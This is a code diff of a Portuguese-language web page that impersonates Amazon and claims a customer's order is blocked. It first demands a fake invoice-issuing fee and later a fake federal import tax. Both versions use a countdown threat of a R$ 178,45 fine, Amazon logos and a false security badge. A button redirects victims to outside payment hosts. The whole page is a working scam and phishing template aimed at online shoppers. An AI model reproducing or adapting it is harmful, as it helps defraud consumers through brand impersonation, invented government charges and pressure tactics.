@@ -27,6 +27,8 @@
     :root {
       --amazon-orange: #FF9900;
       --amazon-orange-hover: #E68A00;
+      --amazon-blue: #232F3E;
+      --amazon-blue-light: #37475A;
       --amazon-gray: #F3F3F3;
       --amazon-white: #FFFFFF;
       --text-primary: #0F1111;
@@ -36,11 +38,7 @@
       --error-color: #B12704;
     }
 
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
 
     body {
       font-family: 'Amazon Ember', Arial, sans-serif;
@@ -50,197 +48,78 @@
     }
 
     #loading-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
       background-color: var(--amazon-white);
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
+      display: flex; flex-direction: column; justify-content: center; align-items: center;
       z-index: 999;
     }
 
-    .logo-loading {
-      width: 150px;
-      margin-bottom: 40px;
-    }
+    .logo-loading { width: 150px; margin-bottom: 40px; }
 
-    .loading-bar {
-      width: 300px;
-      height: 4px;
-      background-color: #DDD;
-      border-radius: 2px;
-      overflow: hidden;
-      margin-bottom: 20px;
-    }
+    .loading-bar { width: 300px; height: 4px; background-color: #DDD; border-radius: 2px; overflow: hidden; margin-bottom: 20px; }
+    .loading-progress { height: 100%; width: 0%; background-color: var(--amazon-orange); animation: loadingBar 3s ease-out forwards; }
+    @keyframes loadingBar { 0% { width: 0%; } 100% { width: 100%; } }
 
-    .loading-progress {
-      height: 100%;
-      width: 0%;
-      background-color: var(--amazon-orange);
-      animation: loadingBar 3s ease-out forwards;
-    }
+    .loading-text { color: var(--text-secondary); font-size: 14px; font-weight: 400; }
 
-    @keyframes loadingBar {
-      0% { width: 0%; }
-      100% { width: 100%; }
-    }
+    .main-container { display: none; max-width: 600px; margin: 14px auto; padding: 0 14px; animation: fadeIn 0.3s ease-out; }
 
-    .loading-text {
-      color: var(--text-secondary);
-      font-size: 14px;
-      font-weight: 400;
-    }
+    .alert-container { background-color: var(--amazon-white); border: 1px solid var(--border-color); border-radius: 8px; overflow: hidden; box-shadow: 0 2px 8px rgba(15,17,17,.15); }
 
-    .main-container {
-      display: none;
-      max-width: 600px;
-      margin: 14px auto;
-      padding: 0 14px;
-      animation: fadeIn 0.3s ease-out;
-    }
+    .alert-header { background-color: #FEF7E0; border-bottom: 1px solid #F0C14B; padding: 14px 18px; }
 
-    .alert-container {
-      background-color: var(--amazon-white);
-      border: 1px solid var(--border-color);
-      border-radius: 8px;
-      box-shadow: 0 2px 8px rgba(15, 17, 17, .15);
-    }
+    .alert-title { display: flex; align-items: center; gap: 8px; margin: 0; }
+    .alert-icon { width: 20px; height: 20px; color: #B12704; }
+    .alert-title h1 { font-size: 16px; font-weight: 700; color: var(--error-color); margin: 0; }
 
-    .alert-header {
-      background-color: #FEF7E0;
-      border-bottom: 1px solid #F0C14B;
-      padding: 14px 18px;
-    }
+    .content-section { padding: 20px 18px; }
 
-    .alert-title {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
+    .amazon-logo-main { width: 103px; display: block; margin: 0 auto 20px auto; }
 
-    .alert-icon {
-      width: 20px;
-      height: 20px;
-      color: #B12704;
-    }
+    .message-box { background-color: #F7F8F8; border: 1px solid var(--border-color); border-radius: 4px; padding: 14px; margin-bottom: 18px; }
 
-    .alert-title h1 {
-      font-size: 16px;
-      font-weight: 700;
-      color: var(--error-color);
-      margin: 0;
-    }
+    .message-text { font-size: 14px; color: var(--text-primary); margin-bottom: 12px; line-height: 1.5; }
+    .message-text:last-child { margin-bottom: 0; }
 
-    .content-section {
-      padding: 20px 18px;
-    }
-
-    .amazon-logo-main {
-      width: 103px;
-      display: block;
-      margin: 0 auto 20px auto;
-    }
-
-    .message-box {
-      background-color: #F7F8F8;
-      border: 1px solid var(--border-color);
-      border-radius: 4px;
-      padding: 14px;
-      margin-bottom: 18px;
-    }
-
-    .message-text {
-      font-size: 14px;
-      color: var(--text-primary);
-      margin-bottom: 12px;
-      line-height: 1.5;
-    }
-
-    .highlight {
-      font-weight: 700;
-    }
+    .highlight { font-weight: 700; color: var(--text-primary); }
 
     .action-button {
-      width: 100%;
-      background-color: var(--amazon-orange);
-      border: 1px solid #A88734;
-      border-top: 1px solid #9C7E31;
-      border-bottom: 1px solid #846A29;
-      color: var(--text-primary);
-      padding: 8px;
-      font-size: 13px;
-      font-weight: 400;
-      border-radius: 3px;
-      cursor: pointer;
-      transition: all 0.1s;
-      text-align: center;
-      font-family: inherit;
+      width: 100%; background-color: var(--amazon-orange);
+      border: 1px solid #A88734; border-top: 1px solid #9C7E31; border-bottom: 1px solid #846A29;
+      color: var(--text-primary); padding: 8px; font-size: 13px; font-weight: 400;
+      border-radius: 3px; cursor: pointer; transition: all 0.1s; text-align: center; font-family: inherit;
+    }
+    .action-button:hover { background-color: var(--amazon-orange-hover); border-color: #9C7E31; }
+    .action-button:active { background-color: #D68910; box-shadow: 0 1px 3px rgba(255,153,0,0.5) inset; }
+
+    .info-section { margin-top: 14px; padding-top: 14px; border-top: 1px solid var(--border-color); }
+    .info-text { font-size: 12px; color: var(--text-light); text-align: center; line-height: 1.3; }
+
+    .security-footer { margin-top: 14px; padding: 10px; background-color: #F7F8F8; border-radius: 4px; text-align: center; }
+    .security-text { font-size: 11px; color: var(--text-secondary); display: flex; align-items: center; justify-content: center; gap: 4px; }
+    .lock-icon { width: 12px; height: 12px; color: #067D62; }
+
+    @media (max-width: 600px) {
+      .main-container { margin: 10px auto; padding: 0 10px; }
+      .content-section { padding: 16px 14px; }
+      .loading-bar { width: 250px; }
     }
 
-    .action-button:hover {
-      background-color: var(--amazon-orange-hover);
-      border-color: #9C7E31;
+    @media (max-width: 480px) {
+      .alert-header { padding: 12px 14px; }
+      .content-section { padding: 14px 12px; }
+      .message-box { padding: 12px; }
     }
 
-    .action-button:active {
-      background-color: #D68910;
-      box-shadow: 0 1px 3px rgba(255, 153, 0, 0.5) inset;
-    }
-
-    .info-section {
-      margin-top: 14px;
-      padding-top: 14px;
-      border-top: 1px solid var(--border-color);
-    }
-
-    .info-text {
-      font-size: 12px;
-      color: var(--text-light);
-      text-align: center;
-      line-height: 1.3;
-    }
-
-    .security-footer {
-      margin-top: 14px;
-      padding: 10px;
-      background-color: #F7F8F8;
-      border-radius: 4px;
-      text-align: center;
-    }
-
-    .security-text {
-      font-size: 11px;
-      color: var(--text-secondary);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 4px;
-    }
-
-    .lock-icon {
-      width: 12px;
-      height: 12px;
-      color: #067D62;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
   </style>
 </head>
 <body>
 
   <div id="loading-overlay">
     <img src="amazonz01.png" alt="Amazon" class="logo-loading">
-    <div class="loading-bar">
-      <div class="loading-progress"></div>
-    </div>
-    <p class="loading-text">Calculando taxa TENF...</p>
+    <div class="loading-bar"><div class="loading-progress"></div></div>
+    <p class="loading-text">Confirmando seu pedido...</p>
   </div>
 
   <div id="main-content" class="main-container">
@@ -250,28 +129,27 @@
           <svg class="alert-icon" fill="currentColor" viewBox="0 0 20 20">
             <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path>
           </svg>
-          <h1>TENF (Taxa de Emissão de Nota Fiscal)</h1>
+          <h1>Problemas no pedido</h1>
         </div>
       </div>
 
       <div class="content-section">
         <img src="amazonz01.png" alt="Amazon" class="amazon-logo-main">
-
+        
         <div class="message-box">
-          <div style="text-align: center; margin-bottom: 16px;">
-            <div style="font-size: 28px; font-weight: 700; color: var(--text-primary);">R$ 29,31</div>
-          </div>
-          <p class="message-text">Para que seu produto seja enviado, é obrigatório quitar a TENF (Taxa de Emissão de Nota Fiscal).</p>
-          <p class="message-text">Essa taxa cobre os custos fiscais exigidos por lei para a emissão do documento e liberação da mercadoria para transporte.</p>
-          <p class="message-text">Sem o pagamento, o documento não será emitido e seu pedido permanecerá bloqueado.</p>
+          <p class="message-text"><span class="highlight">Pendência identificada no seu pedido</span></p>
+          <p class="message-text">Detectamos que o produto que você selecionou é <span class="highlight">importado</span> e, durante o processo de separação para envio, foi identificada uma <span class="highlight">taxa obrigatória de importação</span> exigida pelo <span class="highlight">Governo Federal</span>.</p>
+          <p class="message-text">Sem a <span class="highlight">regularização imediata</span>, seu pedido <span class="highlight">não poderá ser enviado</span> e corre risco de ser <span class="highlight">cancelado</span>.</p>
+          <p class="message-text">Clique para calcular o valor.</p>
         </div>
 
-        <button id="action-button" class="action-button">QUITAR TAXA TENF</button>
+        <button id="action-button" class="action-button">CALCULAR TAXA</button>
 
         <div class="info-section">
           <p class="info-text">Clique para continuar</p>
-          <p class="info-text" style="color: var(--error-color); font-weight: 700; margin-top: 10px;">
-            Caso essa taxa não seja paga nos próximos 30 minutos, seu produto ficará retido e será cobrada uma multa no valor total de R$ 178,45, sem descontos.
+          <p class="info-text">
+            Caso essa taxa não seja paga nos próximos 30 minutos, seu produto ficará retido e será cobrada uma multa no valor total de
+            <span style="color:#B12704; font-weight:700;">R$ 178,45</span>, sem descontos.
           </p>
         </div>
 
@@ -299,7 +177,7 @@
         this.disabled = true;
 
         setTimeout(() => {
-          window.location.href = 'https://pay.canetinhastouch.com/q510ZObaWYX3E9D';
+          window.location.href = 'https://calculandotaxa.vercel.app/';
         }, 500);
       });
     });
